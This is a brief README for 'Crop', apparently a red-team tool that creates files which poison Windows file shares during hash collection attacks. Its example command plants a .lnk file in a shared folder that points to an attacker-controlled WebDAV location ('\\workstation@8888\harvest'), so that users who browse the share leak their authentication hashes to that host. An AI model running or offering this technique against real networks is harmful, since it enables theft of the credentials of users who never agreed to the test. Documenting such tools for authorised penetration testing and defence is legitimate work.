# Crop
Author: @domchell

This project is a submodule of Farmer.

Crop can be used to create various files types capable of poisoning file shares during hash collection attacks.

Usage:
```
crop.exe <folder location> <filename> <webdav location> <LNK value>

Example:
crop.exe \\fileserver\Common crop.lnk \\workstation@8888\harvest \\workstation@8888\harvest
```